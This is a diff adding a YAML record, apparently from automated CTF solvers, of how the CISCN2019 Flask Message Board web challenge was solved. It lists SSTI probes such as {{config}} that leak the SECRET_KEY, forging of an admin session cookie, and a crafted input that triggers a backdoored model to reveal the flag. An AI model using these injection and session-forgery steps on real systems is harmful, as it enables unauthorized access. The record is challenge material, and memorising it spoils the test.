@@ -1,0 +1,44 @@
+name: '[CISCN2019 总决赛 Day1 Web3]Flask Message Board afd422843cf9'
+category: web
+keywords:
+- ciscn2019
+- day1
+- web3
+- flask
+- message
+- board
+- github
+- rmanofcn
+- ciscn2019_final_web4
+steps:
+- 'SSTI confirmed live on this instance: POST /post author={{7*7}} -> renders 49;
+  {{config}} leaks SECRET_KEY=iII1I|il|iIiiI1l|iI1|I1lIl1lIi|il1l1II|1 (config also
+  shows ENV=production,DEBUG=False). No Bot/TF filter triggered on UA=Mozilla content
+  ''hello world!'' (sum=1084, even).'
+- 'FLAG RECOVERED <FLAG> via /post content=''aaaaaaaaa''+chr(1024-873) (9 chars, sum=1024,
+  even) -> flash ''reject because You are: <flag> or hacker''; SSTI->SECRET_KEY iII1I|il|iIiiI1l|iI1|I1lIl1lIi|il1l1II|1
+  -> forged admin validated; odd char-sum contents always pass (Human).'
+- Challenge fully solved on this live instance, no model upload or /admin/model_download
+  needed.
+- '[codex] Live target vulnerable to SSTI in author; `{{config}}` leaks SECRET_KEY;
+  forged admin session accepted at /admin (200 with Settings).'
+- '[codex] Model backdoor confirmed: content char-sum 1024 triggers /flag read, flag
+  returned in flash `reject because You are: ... or hacker`.'
+- '[codex] POC artifacts: `/home/kali/workspace/forge.py`, `/home/kali/workspace/session.txt`,
+  `/home/kali/workspace/r2.html`.'
+- '[codex] FOUND_FLAG=<FLAG>'
+- Native Worker completed a bounded evidence-backed observation
+evidence_chain:
+- 'SSTI confirmed live on this instance: POST /post author={{7*7}} -> renders 49;
+  {{config}} leaks SECRET_KEY=iII1I|il|iIiiI1l|iI1|I1lIl1lIi|il1l1II|1 (config also
+  shows ENV=production,DEBUG=False). No Bot/TF filter triggered on UA=Mozilla content
+  ''hello world!'' (sum=1084, even).'
+- 'FLAG RECOVERED <FLAG> via /post content=''aaaaaaaaa''+chr(1024-873) (9 chars, sum=1024,
+  even) -> flash ''reject because You are: <flag> or hacker''; SSTI->SECRET_KEY iII1I|il|iIiiI1l|iI1|I1lIl1lIi|il1l1II|1
+  -> forged admin validated; odd char-sum contents always pass (Human).'
+- Challenge fully solved on this live instance, no model upload or /admin/model_download
+  needed.
+- '[codex] FOUND_FLAG=<FLAG>'
+success_format: CTF2\{[^}]+\}
+source: afd42284-3cf9-45ac-abbb-ace3ad151558 (solver 674cbdb5-30c5-4ec7-b730-7bea5d082bfc)
+notes: ''
